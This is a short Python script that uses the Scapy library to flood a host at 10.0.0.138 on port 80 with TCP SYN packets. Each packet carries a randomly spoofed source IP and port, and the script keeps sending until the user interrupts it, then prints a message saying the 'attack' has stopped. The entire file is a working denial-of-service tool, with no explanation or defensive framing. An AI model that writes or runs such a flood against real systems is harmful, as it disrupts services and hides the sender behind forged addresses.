from scapy.all import IP, TCP, send, RandShort, RandIP

target_ip = "10.0.0.138"
target_port = 80 

ip = IP(src=RandIP(), dst=target_ip) 
syn=TCP(sport=RandShort(), dport=target_port, flags="S")

try:
    send(ip/syn, loop=1, verbose=False)
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user.")
    print("[*] Cleaning up and exiting...")